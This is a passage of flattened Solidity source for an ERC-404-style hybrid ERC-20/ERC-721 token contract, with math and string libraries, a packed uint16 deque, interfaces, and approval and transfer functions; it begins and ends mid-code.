remainder;\\n            assembly {\\n                // Compute remainder using mulmod.\\n                remainder := mulmod(x, y, denominator)\\n\\n                // Subtract 256 bit number from 512 bit number.\\n                prod1 := sub(prod1, gt(remainder, prod0))\\n                prod0 := sub(prod0, remainder)\\n            }\\n\\n            // Factor powers of two out of denominator and compute largest power of two divisor of denominator.\\n            // Always >= 1. See https://cs.stackexchange.com/q/138556/92363.\\n\\n            uint256 twos = denominator & (0 - denominator);\\n            assembly {\\n                // Divide denominator by twos.\\n                denominator := div(denominator, twos)\\n\\n                // Divide [prod1 prod0] by twos.\\n                prod0 := div(prod0, twos)\\n\\n                // Flip twos such that it is 2^256 / twos. If twos is zero, then it becomes one.\\n                twos := add(div(sub(0, twos), twos), 1)\\n            }\\n\\n            // Shift in bits from prod1 into prod0.\\n            prod0 |= prod1 * twos;\\n\\n            // Invert denominator mod 2^256. Now that denominator is an odd number, it has an inverse modulo 2^256 such\\n            // that denominator * inv = 1 mod 2^256. Compute the inverse by starting with a seed that is correct for\\n            // four bits. That is, denominator * inv = 1 mod 2^4.\\n            uint256 inverse = (3 * denominator) ^ 2;\\n\\n            // Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel's lifting lemma, this also\\n            // works in modular arithmetic, doubling the correct bits in each step.\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^8\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^16\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^32\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^64\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^128\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^256\\n\\n            // Because the division is now exact we can divide by multiplying with the modular inverse of denominator.\\n            // This will give us the correct result modulo 2^256. Since the preconditions guarantee that the outcome is\\n            // less than 2^256, this is the final result. We don't need to compute the high bits of the result and prod1\\n            // is no longer required.\\n            result = prod0 * inverse;\\n            return result;\\n        }\\n    }\\n\\n    /**\\n     * @notice Calculates x * y / denominator with full precision, following the selected rounding direction.\\n     */\\n    function mulDiv(uint256 x, uint256 y, uint256 denominator, Rounding rounding) internal pure returns (uint256) {\\n        uint256 result = mulDiv(x, y, denominator);\\n        if (unsignedRoundsUp(rounding) && mulmod(x, y, denominator) > 0) {\\n            result += 1;\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded\\n     * towards zero.\\n     *\\n     * Inspired by Henry S. Warren, Jr.'s \\\"Hacker's Delight\\\" (Chapter 11).\\n     */\\n    function sqrt(uint256 a) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n\\n        // For our first guess, we get the biggest power of 2 which is smaller than the square root of the target.\\n        //\\n        // We know that the \\\"msb\\\" (most significant bit) of our target number `a` is a power of 2 such that we have\\n        // `msb(a) <= a < 2*msb(a)`. This value can be written `msb(a)=2**k` with `k=log2(a)`.\\n        //\\n        // This can be rewritten `2**log2(a) <= a < 2**(log2(a) + 1)`\\n        // \u2192 `sqrt(2**k) <= sqrt(a) < sqrt(2**(k+1))`\\n        // \u2192 `2**(k/2) <= sqrt(a) < 2**((k+1)/2) <= 2**(k/2 + 1)`\\n        //\\n        // Consequently, `2**(log2(a) / 2)` is a good first approximation of `sqrt(a)` with at least 1 correct bit.\\n        uint256 result = 1 << (log2(a) >> 1);\\n\\n        // At this point `result` is an estimation with one bit of precision. We know the true value is a uint128,\\n        // since it is the square root of a uint256. Newton's method converges quadratically (precision doubles at\\n        // every iteration). We thus need at most 7 iteration to turn our partial result with one bit of precision\\n        // into the expected uint128 result.\\n        unchecked {\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            return min(result, a / result);\\n        }\\n    }\\n\\n    /**\\n     * @notice Calculates sqrt(a), following the selected rounding direction.\\n     */\\n    function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = sqrt(a);\\n            return result + (unsignedRoundsUp(rounding) && result * result < a ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 2 of a positive value rounded towards zero.\\n     * Returns 0 if given 0.\\n     */\\n    function log2(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >> 128 > 0) {\\n                value >>= 128;\\n                result += 128;\\n            }\\n            if (value >> 64 > 0) {\\n                value >>= 64;\\n                result += 64;\\n            }\\n            if (value >> 32 > 0) {\\n                value >>= 32;\\n                result += 32;\\n            }\\n            if (value >> 16 > 0) {\\n                value >>= 16;\\n                result += 16;\\n            }\\n            if (value >> 8 > 0) {\\n                value >>= 8;\\n                result += 8;\\n            }\\n            if (value >> 4 > 0) {\\n                value >>= 4;\\n                result += 4;\\n            }\\n            if (value >> 2 > 0) {\\n                value >>= 2;\\n                result += 2;\\n            }\\n            if (value >> 1 > 0) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 2, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log2(value);\\n            return result + (unsignedRoundsUp(rounding) && 1 << result < value ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10 of a positive value rounded towards zero.\\n     * Returns 0 if given 0.\\n     */\\n    function log10(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >= 10 ** 64) {\\n                value /= 10 ** 64;\\n                result += 64;\\n            }\\n            if (value >= 10 ** 32) {\\n                value /= 10 ** 32;\\n                result += 32;\\n            }\\n            if (value >= 10 ** 16) {\\n                value /= 10 ** 16;\\n                result += 16;\\n            }\\n            if (value >= 10 ** 8) {\\n                value /= 10 ** 8;\\n                result += 8;\\n            }\\n            if (value >= 10 ** 4) {\\n                value /= 10 ** 4;\\n                result += 4;\\n            }\\n            if (value >= 10 ** 2) {\\n                value /= 10 ** 2;\\n                result += 2;\\n            }\\n            if (value >= 10 ** 1) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log10(value);\\n            return result + (unsignedRoundsUp(rounding) && 10 ** result < value ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 256 of a positive value rounded towards zero.\\n     * Returns 0 if given 0.\\n     *\\n     * Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string.\\n     */\\n    function log256(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >> 128 > 0) {\\n                value >>= 128;\\n                result += 16;\\n            }\\n            if (value >> 64 > 0) {\\n                value >>= 64;\\n                result += 8;\\n            }\\n            if (value >> 32 > 0) {\\n                value >>= 32;\\n                result += 4;\\n            }\\n            if (value >> 16 > 0) {\\n                value >>= 16;\\n                result += 2;\\n            }\\n            if (value >> 8 > 0) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 256, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log256(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log256(value);\\n            return result + (unsignedRoundsUp(rounding) && 1 << (result << 3) < value ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns whether a provided rounding mode is considered rounding up for unsigned integers.\\n     */\\n    function unsignedRoundsUp(Rounding rounding) internal pure returns (bool) {\\n        return uint8(rounding) % 2 == 1;\\n    }\\n}\\n\\nlibrary SignedMath {\\n    /**\\n     * @dev Returns the largest of two signed numbers.\\n     */\\n    function max(int256 a, int256 b) internal pure returns (int256) {\\n        return a > b ? a : b;\\n    }\\n\\n    /**\\n     * @dev Returns the smallest of two signed numbers.\\n     */\\n    function min(int256 a, int256 b) internal pure returns (int256) {\\n        return a < b ? a : b;\\n    }\\n\\n    /**\\n     * @dev Returns the average of two signed numbers without overflow.\\n     * The result is rounded towards zero.\\n     */\\n    function average(int256 a, int256 b) internal pure returns (int256) {\\n        // Formula from the book \\\"Hacker's Delight\\\"\\n        int256 x = (a & b) + ((a ^ b) >> 1);\\n        return x + (int256(uint256(x) >> 255) & (a ^ b));\\n    }\\n\\n    /**\\n     * @dev Returns the absolute unsigned value of a signed value.\\n     */\\n    function abs(int256 n) internal pure returns (uint256) {\\n        unchecked {\\n            // must be unchecked in order to support `n = type(int256).min`\\n            return uint256(n >= 0 ? n : -n);\\n        }\\n    }\\n}\\n\\nlibrary Strings {\\n    bytes16 private constant HEX_DIGITS = \\\"0123456789abcdef\\\";\\n    uint8 private constant ADDRESS_LENGTH = 20;\\n\\n    /**\\n     * @dev The `value` string doesn't fit in the specified `length`.\\n     */\\n    error StringsInsufficientHexLength(uint256 value, uint256 length);\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` decimal representation.\\n     */\\n    function toString(uint256 value) internal pure returns (string memory) {\\n        unchecked {\\n            uint256 length = Math.log10(value) + 1;\\n            string memory buffer = new string(length);\\n            uint256 ptr;\\n            /// @solidity memory-safe-assembly\\n            assembly {\\n                ptr := add(buffer, add(32, length))\\n            }\\n            while (true) {\\n                ptr--;\\n                /// @solidity memory-safe-assembly\\n                assembly {\\n                    mstore8(ptr, byte(mod(value, 10), HEX_DIGITS))\\n                }\\n                value /= 10;\\n                if (value == 0) break;\\n            }\\n            return buffer;\\n        }\\n    }\\n\\n    /**\\n     * @dev Converts a `int256` to its ASCII `string` decimal representation.\\n     */\\n    function toStringSigned(int256 value) internal pure returns (string memory) {\\n        return string.concat(value < 0 ? \\\"-\\\" : \\\"\\\", toString(SignedMath.abs(value)));\\n    }\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.\\n     */\\n    function toHexString(uint256 value) internal pure returns (string memory) {\\n        unchecked {\\n            return toHexString(value, Math.log256(value) + 1);\\n        }\\n    }\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.\\n     */\\n    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {\\n        uint256 localValue = value;\\n        bytes memory buffer = new bytes(2 * length + 2);\\n        buffer[0] = \\\"0\\\";\\n        buffer[1] = \\\"x\\\";\\n        for (uint256 i = 2 * length + 1; i > 1; --i) {\\n            buffer[i] = HEX_DIGITS[localValue & 0xf];\\n            localValue >>= 4;\\n        }\\n        if (localValue != 0) {\\n            revert StringsInsufficientHexLength(value, length);\\n        }\\n        return string(buffer);\\n    }\\n\\n    /**\\n     * @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal\\n     * representation.\\n     */\\n    function toHexString(address addr) internal pure returns (string memory) {\\n        return toHexString(uint256(uint160(addr)), ADDRESS_LENGTH);\\n    }\\n\\n    /**\\n     * @dev Returns true if the two strings are equal.\\n     */\\n    function equal(string memory a, string memory b) internal pure returns (bool) {\\n        return bytes(a).length == bytes(b).length && keccak256(bytes(a)) == keccak256(bytes(b));\\n    }\\n}\\n\\ninterface IERC721Receiver {\\n    /**\\n     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}\\n     * by `operator` from `from`, this function is called.\\n     *\\n     * It must return its Solidity selector to confirm the token transfer.\\n     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be\\n     * reverted.\\n     *\\n     * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.\\n     */\\n    function onERC721Received(\\n        address operator,\\n        address from,\\n        uint256 tokenId,\\n        bytes calldata data\\n    ) external returns (bytes4);\\n}\\n\\ninterface IERC165 {\\n    /**\\n     * @dev Returns true if this contract implements the interface defined by\\n     * `interfaceId`. See the corresponding\\n     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]\\n     * to learn more about how these ids are created.\\n     *\\n     * This function call must use less than 30 000 gas.\\n     */\\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\\n}\\n\\ninterface IERC404 {\\n  error NotFound();\\n  error InvalidTokenId();\\n  error AlreadyExists();\\n  error InvalidRecipient();\\n  error InvalidSender();\\n  error InvalidSpender();\\n  error InvalidOperator();\\n  error UnsafeRecipient();\\n  error RecipientIsERC721TransferExempt();\\n  error Unauthorized();\\n  error InsufficientAllowance();\\n  error DecimalsTooLow();\\n  error PermitDeadlineExpired();\\n  error InvalidSigner();\\n  error InvalidApproval();\\n  error OwnedIndexOverflow();\\n  error MintLimitReached();\\n  error InvalidExemption();\\n\\n  function name() external view returns (string memory);\\n  function symbol() external view returns (string memory);\\n  function decimals() external view returns (uint8);\\n  function totalSupply() external view returns (uint256);\\n  function erc20TotalSupply() external view returns (uint256);\\n  function erc721TotalSupply() external view returns (uint256);\\n  function balanceOf(address owner_) external view returns (uint256);\\n  function erc721BalanceOf(address owner_) external view returns (uint256);\\n  function erc20BalanceOf(address owner_) external view returns (uint256);\\n  function erc721TransferExempt(address account_) external view returns (bool);\\n  function isApprovedForAll(\\n    address owner_,\\n    address operator_\\n  ) external view returns (bool);\\n  function allowance(\\n    address owner_,\\n    address spender_\\n  ) external view returns (uint256);\\n  function owned(address owner_) external view returns (uint256[] memory);\\n  function ownerOf(uint256 id_) external view returns (address erc721Owner);\\n  function tokenURI(uint256 id_) external view returns (string memory);\\n  function approve(\\n    address spender_,\\n    uint256 valueOrId_\\n  ) external returns (bool);\\n  function erc20Approve(\\n    address spender_,\\n    uint256 value_\\n  ) external returns (bool);\\n  function erc721Approve(address spender_, uint256 id_) external;\\n  function setApprovalForAll(address operator_, bool approved_) external;\\n  function transferFrom(\\n    address from_,\\n    address to_,\\n    uint256 valueOrId_\\n  ) external returns (bool);\\n  function erc20TransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 value_\\n  ) external returns (bool);\\n  function erc721TransferFrom(address from_, address to_, uint256 id_) external;\\n  function transfer(address to_, uint256 amount_) external returns (bool);\\n  function getERC721QueueLength() external view returns (uint256);\\n  function getERC721TokensInQueue(\\n    uint256 start_,\\n    uint256 count_\\n  ) external view returns (uint256[] memory);\\n  function setSelfERC721TransferExempt(bool state_) external;\\n  function safeTransferFrom(address from_, address to_, uint256 id_) external;\\n  function safeTransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 id_,\\n    bytes calldata data_\\n  ) external;\\n  function DOMAIN_SEPARATOR() external view returns (bytes32);\\n  function permit(\\n    address owner_,\\n    address spender_,\\n    uint256 value_,\\n    uint256 deadline_,\\n    uint8 v_,\\n    bytes32 r_,\\n    bytes32 s_\\n  ) external;\\n}\\n\\nlibrary PackedDoubleEndedQueue {\\n  uint128 constant SLOT_MASK = (1 << 64) - 1;\\n  uint128 constant INDEX_MASK = SLOT_MASK << 64;\\n\\n  uint256 constant SLOT_DATA_MASK = (1 << 16) - 1;\\n\\n  /**\\n   * @dev An operation (e.g. {front}) couldn't be completed due to the queue being empty.\\n   */\\n  error QueueEmpty();\\n\\n  /**\\n   * @dev A push operation couldn't be completed due to the queue being full.\\n   */\\n  error QueueFull();\\n\\n  /**\\n   * @dev An operation (e.g. {at}) couldn't be completed due to an index being out of bounds.\\n   */\\n  error QueueOutOfBounds();\\n\\n  /**\\n   * @dev Invalid slot.\\n   */\\n  error InvalidSlot();\\n\\n  /**\\n   * @dev Indices and slots are 64 bits to fit within a single storage slot.\\n   *\\n   * Struct members have an underscore prefix indicating that they are \\\"private\\\" and should not be read or written to\\n   * directly. Use the functions provided below instead. Modifying the struct manually may violate assumptions and\\n   * lead to unexpected behavior.\\n   *\\n   * The first item is at data[begin] and the last item is at data[end - 1]. This range can wrap around.\\n   */\\n  struct Uint16Deque {\\n    uint64 _beginIndex;\\n    uint64 _beginSlot;\\n    uint64 _endIndex;\\n    uint64 _endSlot;\\n    mapping(uint64 index => uint256) _data;\\n  }\\n\\n  /**\\n   * @dev Removes the item at the end of the queue and returns it.\\n   *\\n   * Reverts with {QueueEmpty} if the queue is empty.\\n   */\\n  function popBack(Uint16Deque storage deque) internal returns (uint16 value) {\\n    unchecked {\\n      uint64 backIndex = deque._endIndex;\\n      uint64 backSlot = deque._endSlot;\\n\\n      if (backIndex == deque._beginIndex && backSlot == deque._beginSlot)\\n        revert QueueEmpty();\\n\\n      if (backSlot == 0) {\\n        --backIndex;\\n        backSlot = 15;\\n      } else {\\n        --backSlot;\\n      }\\n\\n      uint256 data = deque._data[backIndex];\\n\\n      value = _getEntry(data, backSlot);\\n      deque._data[backIndex] = _setData(data, backSlot, 0);\\n\\n      deque._endIndex = backIndex;\\n      deque._endSlot = backSlot;\\n    }\\n  }\\n\\n  /**\\n   * @dev Inserts an item at the beginning of the queue.\\n   *\\n   * Reverts with {QueueFull} if the queue is full.\\n   */\\n  function pushFront(Uint16Deque storage deque, uint16 value_) internal {\\n    unchecked {\\n      uint64 frontIndex = deque._beginIndex;\\n      uint64 frontSlot = deque._beginSlot;\\n\\n      if (frontSlot == 0) {\\n        --frontIndex;\\n        frontSlot = 15;\\n      } else {\\n        --frontSlot;\\n      }\\n\\n      if (frontIndex == deque._endIndex && frontSlot == deque._endSlot)\\n        revert QueueFull();\\n\\n      deque._data[frontIndex] = _setData(\\n        deque._data[frontIndex],\\n        frontSlot,\\n        value_\\n      );\\n      deque._beginIndex = frontIndex;\\n      deque._beginSlot = frontSlot;\\n    }\\n  }\\n\\n  /**\\n   * @dev Return the item at a position in the queue given by `index`, with the first item at 0 and last item at\\n   * `length(deque) - 1`.\\n   *\\n   * Reverts with `QueueOutOfBounds` if the index is out of bounds.\\n   */\\n  function at(\\n    Uint16Deque storage deque,\\n    uint256 index_\\n  ) internal view returns (uint16 value) {\\n    if (index_ >= length(deque) * 16) revert QueueOutOfBounds();\\n\\n    unchecked {\\n      return\\n        _getEntry(\\n          deque._data[\\n            deque._beginIndex +\\n              uint64(deque._beginSlot + (index_ % 16)) /\\n              16 +\\n              uint64(index_ / 16)\\n          ],\\n          uint64(((deque._beginSlot + index_) % 16))\\n        );\\n    }\\n  }\\n\\n  /**\\n   * @dev Returns the number of items in the queue.\\n   */\\n  function length(Uint16Deque storage deque) internal view returns (uint256) {\\n    unchecked {\\n      return\\n        (16 - deque._beginSlot) +\\n        deque._endSlot +\\n        deque._endIndex *\\n        16 -\\n        deque._beginIndex *\\n        16 -\\n        16;\\n    }\\n  }\\n\\n  /**\\n   * @dev Returns true if the queue is empty.\\n   */\\n  function empty(Uint16Deque storage deque) internal view returns (bool) {\\n    return\\n      deque._endSlot == deque._beginSlot &&\\n      deque._endIndex == deque._beginIndex;\\n  }\\n\\n  function _setData(\\n    uint256 data_,\\n    uint64 slot_,\\n    uint16 value\\n  ) private pure returns (uint256) {\\n    return (data_ & (~_getSlotMask(slot_))) + (uint256(value) << (16 * slot_));\\n  }\\n\\n  function _getEntry(uint256 data, uint64 slot_) private pure returns (uint16) {\\n    return uint16((data & _getSlotMask(slot_)) >> (16 * slot_));\\n  }\\n\\n  function _getSlotMask(uint64 slot_) private pure returns (uint256) {\\n    return SLOT_DATA_MASK << (slot_ * 16);\\n  }\\n}\\n\\nlibrary ERC721Events {\\n  event ApprovalForAll(\\n    address indexed owner,\\n    address indexed operator,\\n    bool approved\\n  );\\n  event Approval(\\n    address indexed owner,\\n    address indexed spender,\\n    uint256 indexed id\\n  );\\n  event Transfer(address indexed from, address indexed to, uint256 indexed id);\\n}\\n\\nlibrary ERC20Events {\\n  event Approval(address indexed owner, address indexed spender, uint256 value);\\n  event Transfer(address indexed from, address indexed to, uint256 amount);\\n}\\n\\nabstract contract ERC404U16 is IERC404 {\\n  using PackedDoubleEndedQueue for PackedDoubleEndedQueue.Uint16Deque;\\n\\n  /// @dev The queue of ERC-721 tokens stored in the contract.\\n  PackedDoubleEndedQueue.Uint16Deque private _storedERC721Ids;\\n\\n  /// @dev Token name\\n  string public name;\\n\\n  /// @dev Token symbol\\n  string public symbol;\\n\\n  /// @dev Decimals for ERC-20 representation\\n  uint8 public immutable decimals;\\n\\n  /// @dev Units for ERC-20 representation\\n  uint256 public immutable units;\\n\\n  /// @dev Total supply in ERC-20 representation\\n  uint256 public totalSupply;\\n\\n  /// @dev Current mint counter which also represents the highest\\n  ///      minted id, monotonically increasing to ensure accurate ownership\\n  uint256 public minted;\\n\\n  /// @dev Initial chain id for EIP-2612 support\\n  uint256 internal immutable _INITIAL_CHAIN_ID;\\n\\n  /// @dev Initial domain separator for EIP-2612 support\\n  bytes32 internal immutable _INITIAL_DOMAIN_SEPARATOR;\\n\\n  /// @dev Balance of user in ERC-20 representation\\n  mapping(address => uint256) public balanceOf;\\n\\n  /// @dev Allowance of user in ERC-20 representation\\n  mapping(address => mapping(address => uint256)) public allowance;\\n\\n  /// @dev Approval in ERC-721 representaion\\n  mapping(uint256 => address) public getApproved;\\n\\n  /// @dev Approval for all in ERC-721 representation\\n  mapping(address => mapping(address => bool)) public isApprovedForAll;\\n\\n  /// @dev Packed representation of ownerOf and owned indices\\n  mapping(uint256 => uint256) internal _ownedData;\\n\\n  /// @dev Array of owned ids in ERC-721 representation\\n  mapping(address => uint16[]) internal _owned;\\n\\n  /// @dev Addresses that are exempt from ERC-721 transfer, typically for gas savings (pairs, routers, etc)\\n  mapping(address => bool) internal _erc721TransferExempt;\\n\\n  /// @dev EIP-2612 nonces\\n  mapping(address => uint256) public nonces;\\n\\n  /// @dev Address bitmask for packed ownership data\\n  uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;\\n\\n  /// @dev Owned index bitmask for packed ownership data\\n  uint256 private constant _BITMASK_OWNED_INDEX = ((1 << 96) - 1) << 160;\\n\\n  /// @dev Constant for token id encoding\\n  uint256 public constant ID_ENCODING_PREFIX = 1 << 255;\\n\\n  constructor(string memory name_, string memory symbol_, uint8 decimals_) {\\n    name = name_;\\n    symbol = symbol_;\\n\\n    if (decimals_ < 18) {\\n      revert DecimalsTooLow();\\n    }\\n\\n    decimals = decimals_;\\n    units = 10 ** decimals;\\n\\n    // EIP-2612 initialization\\n    _INITIAL_CHAIN_ID = block.chainid;\\n    _INITIAL_DOMAIN_SEPARATOR = _computeDomainSeparator();\\n  }\\n\\n  /// @notice Function to find owner of a given ERC-721 token\\n  function ownerOf(\\n    uint256 id_\\n  ) public view virtual returns (address erc721Owner) {\\n    erc721Owner = _getOwnerOf(id_);\\n\\n    if (!_isValidTokenId(id_)) {\\n      revert InvalidTokenId();\\n    }\\n\\n    if (erc721Owner == address(0)) {\\n      revert NotFound();\\n    }\\n  }\\n\\n  function owned(\\n    address owner_\\n  ) public view virtual returns (uint256[] memory) {\\n    uint256[] memory ownedAsU256 = new uint256[](_owned[owner_].length);\\n\\n    for (uint256 i = 0; i < _owned[owner_].length; ) {\\n      ownedAsU256[i] = ID_ENCODING_PREFIX + _owned[owner_][i];\\n\\n      unchecked {\\n        ++i;\\n      }\\n    }\\n\\n    return ownedAsU256;\\n  }\\n\\n  function erc721BalanceOf(\\n    address owner_\\n  ) public view virtual returns (uint256) {\\n    return _owned[owner_].length;\\n  }\\n\\n  function erc20BalanceOf(\\n    address owner_\\n  ) public view virtual returns (uint256) {\\n    return balanceOf[owner_];\\n  }\\n\\n  function erc20TotalSupply() public view virtual returns (uint256) {\\n    return totalSupply;\\n  }\\n\\n  function erc721TotalSupply() public view virtual returns (uint256) {\\n    return minted;\\n  }\\n\\n  function getERC721QueueLength() public view virtual returns (uint256) {\\n    return _storedERC721Ids.length();\\n  }\\n\\n  function getERC721TokensInQueue(\\n    uint256 start_,\\n    uint256 count_\\n  ) public view virtual returns (uint256[] memory) {\\n    uint256[] memory tokensInQueue = new uint256[](count_);\\n\\n    for (uint256 i = start_; i < start_ + count_; ) {\\n      tokensInQueue[i - start_] = ID_ENCODING_PREFIX + _storedERC721Ids.at(i);\\n\\n      unchecked {\\n        ++i;\\n      }\\n    }\\n\\n    return tokensInQueue;\\n  }\\n\\n  /// @notice tokenURI must be implemented by child contract\\n  function tokenURI(uint256 id_) public view virtual returns (string memory);\\n\\n  /// @notice Function for token approvals\\n  /// @dev This function assumes the operator is attempting to approve an ERC-721\\n  ///      if valueOrId is less than the minted count. Unlike setApprovalForAll,\\n  ///      spender_ must be allowed to be 0x0 so that approval can be revoked.\\n  function approve(\\n    address spender_,\\n    uint256 valueOrId_\\n  ) public virtual returns (bool) {\\n    // The ERC-721 tokens are 1-indexed, so 0 is not a valid id and indicates that\\n    // operator is attempting to set the ERC-20 allowance to 0.\\n    if (_isValidTokenId(valueOrId_)) {\\n      erc721Approve(spender_, valueOrId_);\\n    } else {\\n      return erc20Approve(spender_, valueOrId_);\\n    }\\n\\n    return true;\\n  }\\n\\n  function erc721Approve(address spender_, uint256 id_) public virtual {\\n    // Intention is to approve as ERC-721 token (id).\\n    address erc721Owner = _getOwnerOf(id_);\\n\\n    if (\\n      msg.sender != erc721Owner && !isApprovedForAll[erc721Owner][msg.sender]\\n    ) {\\n      revert Unauthorized();\\n    }\\n\\n    getApproved[id_] = spender_;\\n\\n    emit ERC721Events.Approval(erc721Owner, spender_, id_);\\n  }\\n\\n  /// @dev Providing type(uint256).max for approval value results in an\\n  ///      unlimited approval that is not deducted from on transfers.\\n  function erc20Approve(\\n    address spender_,\\n    uint256 value_\\n  ) public virtual returns (bool) {\\n    // Prevent granting 0x0 an ERC-20 allowance.\\n    if (spender_ == address(0)) {\\n      revert InvalidSpender();\\n    }\\n\\n    // Intention is to approve as ERC-20 token (value).\\n    allowance[msg.sender][spender_] = value_;\\n\\n    emit ERC20Events.Approval(msg.sender, spender_, value_);\\n\\n    return true;\\n  }\\n\\n  /// @notice Function for ERC-721 approvals\\n  function setApprovalForAll(address operator_, bool approved_) public virtual {\\n    // Prevent approvals to 0x0.\\n    if (operator_ == address(0)) {\\n      revert InvalidOperator();\\n    }\\n    isApprovedForAll[msg.sender][operator_] = approved_;\\n    emit ERC721Events.ApprovalForAll(msg.sender, operator_, approved_);\\n  }\\n\\n  /// @notice Function for mixed transfers from an operator that may be different than 'from'.\\n  /// @dev This function assumes the operator is attempting to transfer an ERC-721\\n  ///      if valueOrId is less than or equal to current max id.\\n  function transferFrom(\\n    address from_,\\n    address to_,\\n    uint256 valueOrId_\\n  ) public virtual returns (bool) {\\n    if (_isValidTokenId(valueOrId_)) {\\n      erc721TransferFrom(from_, to_, valueOrId_);\\n    } else {\\n      // Intention is to transfer as ERC-20 token (value).\\n      return erc20TransferFrom(from_, to_, valueOrId_);\\n    }\\n\\n    return true;\\n  }\\n\\n  /// @notice Function for ERC-721 transfers from.\\n  /// @dev This function is recommended for ERC721 transfers\\n  function erc721TransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 id_\\n  ) public virtual {\\n    // Prevent transferring tokens from 0x0.\\n    if (from_ == address(0)) {\\n      revert InvalidSender();\\n    }\\n\\n    // Prevent burning tokens to 0x0.\\n    if (to_ == address(0)) {\\n      revert InvalidRecipient();\\n    }\\n\\n    if (from_ != _getOwnerOf(id_)) {\\n      revert Unauthorized();\\n    }\\n\\n    // Check that the operator is either the sender or approved for the transfer.\\n    if (\\n      msg.sender != from_ &&\\n      !isApprovedForAll[from_][msg.sender] &&\\n      msg.sender != getApproved[id_]\\n    ) {\\n      revert Unauthorized();\\n    }\\n\\n    if (erc721TransferExempt(to_)) {\\n      revert RecipientIsERC721TransferExempt();\\n    }\\n\\n    // Transfer 1 * units ERC-20 and 1 ERC-721 token.\\n    // ERC-721 transfer exemptions handled above. Can't make it to this point if either is transfer exempt.\\n    _transferERC20(from_, to_, units);\\n    _transferERC721(from_, to_, id_);\\n  }\\n\\n  /// @notice Function for ERC-20 transfers from.\\n  /// @dev This function is recommended for ERC20 transfers\\n  function erc20TransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 value_\\n  ) public virtual returns (bool) {\\n    // Prevent transferring tokens from 0x0.\\n    if (from_ == address(0)) {\\n      revert InvalidSender();\\n    }\\n\\n    // Prevent burning tokens to 0x0.\\n    if (to_ == address(0)) {\\n      revert InvalidRecipient();\\n    }\\n\\n    // Intention is to transfer as ERC-20 token (value).\\n    uint256 allowed = allowance[from_][msg.sender];\\n\\n    // Check that the operator has sufficient allowance.\\n    if (allowed != type(uint256).max) {\\n      allowance[from_][msg.sender] = allowed - value_;\\n    }\\n\\n    // Transferring ERC-20s directly requires the _transfer function.\\n    // Handles ERC-721 exemptions internally.\\n    return _transferERC20WithERC721(from_, to_, value_);\\n  }\\n\\n  /// @notice Function for ERC-20 transfers.\\n  /// @dev This function assumes the operator is attempting to transfer as ERC-20\\n  ///      given this function is only supported on the ERC-20 interface.\\n  ///      Treats even small amounts that are valid ERC-721 ids as ERC-20s.\\n  function transfer(address to_, uint256 value_) public virtual returns (bool) {\\n    // Prevent burning tokens to 0x0.\\n    if (to_ == address(0)) {\\n      revert InvalidRecipient();\\n    }\\n\\n    // Transferring ERC-20s directly requires the _transfer function.\\n    // Handles ERC-721 exemptions internally.\\n    return _transferERC20WithERC721(msg.sender, to_, value_);\\n  }\\n\\n  /// @notice Function for ERC-721 transfers with contract support.\\n  /// This function only supports moving valid ERC-721 ids, as it does not exist on the ERC-20\\n  /// spec and will revert otherwise.\\n  function safeTransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 id_\\n  ) public virtual {\\n    safeTransferFrom(from_, to_, id_, \\\"\\\");\\n  }\\n\\n  /// @notice Function for 